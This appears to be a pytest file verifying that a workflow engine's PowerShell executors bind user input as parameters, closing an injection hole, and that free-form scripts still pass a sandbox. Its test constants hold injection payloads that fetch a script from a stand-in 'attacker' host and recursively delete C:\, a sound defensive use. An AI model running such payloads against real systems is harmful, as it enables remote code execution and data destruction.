"""Tests for Sprint 1 item S1-1: workflow engine parameter binding.

The audit found that block executors built PowerShell scripts via Python
f-string interpolation, allowing arbitrary RCE through user-supplied
service/process/drive fields. The fix replaces interpolation with pypsrp
parameter binding so that user input is never re-parsed as PowerShell code.

These tests verify:
  - The structured-input executors call ``add_parameter`` with the literal
    user input, and the script body sent via ``add_script`` contains no
    user input concatenated as text.
  - The two genuinely free-form blocks (``run_powershell`` and
    ``condition``) still go through ``ps_sandbox.validate_script``.
  - The "Known limitations" docstring section in ``ps_sandbox.py`` exists,
    so future cleanups don't quietly drop the honest documentation of the
    sandbox boundary.
"""

from __future__ import annotations

import re
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import patch

import pytest

import workflow_engine


# ---------------------------------------------------------------------------
# Mock harness
# ---------------------------------------------------------------------------

class MockPowerShell:
    """Records every add_script / add_cmdlet / add_parameter call.

    Returned from invoke() with a fixed empty result so the executor's
    post-processing can run normally.
    """

    def __init__(self):
        self.calls = []  # list of (op, args)
        self.had_errors = False
        # All PowerShell streams the output formatter reads. pypsrp's real
        # PowerShell exposes these as live lists; the mock just provides
        # empty defaults so _format_ps_output's iteration doesn't crash.
        self.streams = SimpleNamespace(
            error=[], warning=[], information=[], verbose=[], debug=[],
        )

    def add_script(self, script):
        self.calls.append(("add_script", script))
        return self

    def add_cmdlet(self, name):
        self.calls.append(("add_cmdlet", name))
        return self

    def add_parameter(self, name, value):
        self.calls.append(("add_parameter", name, value))
        return self

    def invoke(self):
        return []

    # Convenience accessors used by assertions
    @property
    def script_bodies(self):
        return [c[1] for c in self.calls if c[0] == "add_script"]

    @property
    def parameters(self):
        return [(c[1], c[2]) for c in self.calls if c[0] == "add_parameter"]


class MockRunspacePool:
    def __init__(self, wsman):
        self.wsman = wsman

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False


@pytest.fixture()
def mock_ps(monkeypatch):
    """Patch pypsrp.powershell so workflow_engine builds against our mocks.

    Yields a list-of-MockPowerShell that records every invocation in order.
    """
    created = []

    def _make_ps(pool):
        ps = MockPowerShell()
        created.append(ps)
        return ps

    # workflow_engine imports inside the function, so patch the symbols
    # at the source module path.
    import pypsrp.powershell as pw
    monkeypatch.setattr(pw, "PowerShell", _make_ps)
    monkeypatch.setattr(pw, "RunspacePool", MockRunspacePool)
    yield created


@pytest.fixture()
def fake_winrm(monkeypatch):
    """Stop _connect_winrm from actually opening a WSMan to a real host."""
    monkeypatch.setattr(workflow_engine, "_connect_winrm",
                        lambda server_cfg: SimpleNamespace(host="fake"))


def _server_map():
    return {"srv1": SimpleNamespace(name="srv1", host="srv1.local")}


# ---------------------------------------------------------------------------
# Injection-resistance tests for the converted executors
# ---------------------------------------------------------------------------

EVIL_SERVICE = "Spooler'; Invoke-WebRequest http://attacker/x.ps1; '"
EVIL_PROCESS = "lsass`; $(rm -rf C:\\)"
EVIL_DRIVE = "C; Remove-Item -Path C:\\ -Recurse -Force"


def test_check_service_does_not_inject(mock_ps, fake_winrm):
    """check_service binds the service name as a parameter; the script body
    is the fixed param-block, never the attacker payload."""
    config = {"server": "srv1", "service": EVIL_SERVICE}
    success, _ = workflow_engine._exec_check_service(
        config, _server_map(), db=None, settings={})

    assert mock_ps, "PowerShell instance was never created"
    ps = mock_ps[0]
    # The script body is fixed and contains no user input
    assert ps.script_bodies, "add_script was never called"
    body = ps.script_bodies[0]
    assert EVIL_SERVICE not in body
    assert "Invoke-WebRequest" not in body
    # The evil payload is bound as a typed parameter value, untouched
    assert ("Name", EVIL_SERVICE) in ps.parameters


def test_check_process_does_not_inject(mock_ps, fake_winrm):
    config = {"server": "srv1", "process": EVIL_PROCESS}
    workflow_engine._exec_check_process(config, _server_map(), db=None, settings={})

    assert mock_ps
    ps = mock_ps[0]
    assert ps.script_bodies
    body = ps.script_bodies[0]
    assert EVIL_PROCESS not in body
    assert ("Name", EVIL_PROCESS) in ps.parameters


def test_kill_process_does_not_inject(mock_ps, fake_winrm):
    """kill_process used to build:
        Stop-Process -Name '<half-baked replace>' ...
    which still allowed backtick + $() injection. The new version binds the
    name as a parameter — the script body is fixed.
    """
    config = {"server": "srv1", "process_name": EVIL_PROCESS}
    workflow_engine._exec_kill_process(config, _server_map(), db=None, settings={})

    assert mock_ps
    ps = mock_ps[0]
    body = ps.script_bodies[0]
    assert EVIL_PROCESS not in body
    assert "rm -rf" not in body
    assert ("Name", EVIL_PROCESS) in ps.parameters


def test_check_disk_does_not_inject(mock_ps, fake_winrm):
    """check_disk used to interpolate the drive into ``Get-PSDrive {drive}``
    with no quoting at all. The new version binds Drive as a parameter."""
    config = {"server": "srv1", "drive": EVIL_DRIVE, "min_free_pct": 10}
    workflow_engine._exec_check_disk(config, _server_map(), db=None, settings={})

    assert mock_ps
    ps = mock_ps[0]
    body = ps.script_bodies[0]
    assert EVIL_DRIVE not in body
    assert "Remove-Item" not in body
    assert ("Drive", EVIL_DRIVE) in ps.parameters


def test_restart_service_does_not_inject(mock_ps, fake_winrm):
    config = {"server": "srv1", "service": EVIL_SERVICE}
    workflow_engine._exec_restart_service(config, _server_map(), db=None, settings={})

    assert mock_ps
    ps = mock_ps[0]
    body = ps.script_bodies[0]
    assert EVIL_SERVICE not in body
    assert ("Name", EVIL_SERVICE) in ps.parameters


def test_stop_service_does_not_inject(mock_ps, fake_winrm):
    config = {"server": "srv1", "service": EVIL_SERVICE}
    workflow_engine._exec_stop_service(config, _server_map(), db=None, settings={})

    assert mock_ps
    ps = mock_ps[0]
    body = ps.script_bodies[0]
    assert EVIL_SERVICE not in body
    assert ("Name", EVIL_SERVICE) in ps.parameters


def test_start_service_does_not_inject(mock_ps, fake_winrm):
    config = {"server": "srv1", "service": EVIL_SERVICE}
    workflow_engine._exec_start_service(config, _server_map(), db=None, settings={})

    assert mock_ps
    ps = mock_ps[0]
    body = ps.script_bodies[0]
    assert EVIL_SERVICE not in body
    assert ("Name", EVIL_SERVICE) in ps.parameters


# ---------------------------------------------------------------------------
# The two free-form blocks must still go through the sandbox
# ---------------------------------------------------------------------------

def test_existing_run_powershell_still_sandboxed(mock_ps, fake_winrm):
    """Regression: run_powershell hands off to ps_sandbox.validate_script.

    Sending a script with the hard-deny token Invoke-Expression must be
    rejected, regardless of any parameter-binding refactor elsewhere.
    """
    config = {"server": "srv1",
              "script": "Invoke-Expression 'whoami'"}
    success, output = workflow_engine._exec_run_powershell(
        config, _server_map(), db=None, settings={})
    assert success is False
    assert "sandbox" in output.lower() or "disallowed" in output.lower()
    # Crucially: no PowerShell pipeline should have been executed for the
    # rejected script.
    assert not mock_ps, "Sandbox-rejected script should not reach pypsrp"


def test_existing_condition_still_sandboxed(mock_ps, fake_winrm):
    """Regression: condition expressions still validated."""
    config = {"server": "srv1",
              "expression": "iex 'whoami'"}  # hard-denied alias
    success, output = workflow_engine._exec_condition(
        config, _server_map(), db=None, settings={})
    assert success is False
    assert "sandbox" in output.lower() or "disallowed" in output.lower()
    assert not mock_ps


# ---------------------------------------------------------------------------
# Documentation regression: the "Known limitations" section must exist
# ---------------------------------------------------------------------------

def test_sandbox_documented_limits_present():
    """The honest accounting of the sandbox's bypass classes must remain in
    ps_sandbox.py — future cleanups should not quietly drop it.
    """
    src = Path(workflow_engine.__file__).with_name("ps_sandbox.py").read_text(
        encoding="utf-8")
    assert "Known limitations" in src
    # Must mention the specific bypass classes
    assert "Constrained Language Mode" in src or "ConstrainedLanguage" in src
    assert "JEA" in src
    # Must reference the operator-facing doc
    assert "WORKFLOW_SANDBOX.md" in src


def test_workflow_sandbox_doc_exists():
    """The operator-facing rollout doc must exist alongside the code."""
    doc = Path(workflow_engine.__file__).parent / "docs" / "WORKFLOW_SANDBOX.md"
    assert doc.exists(), f"Expected doc at {doc}"
    text = doc.read_text(encoding="utf-8")
    assert "JEA" in text
    assert "Constrained Language" in text or "ConstrainedLanguage" in text
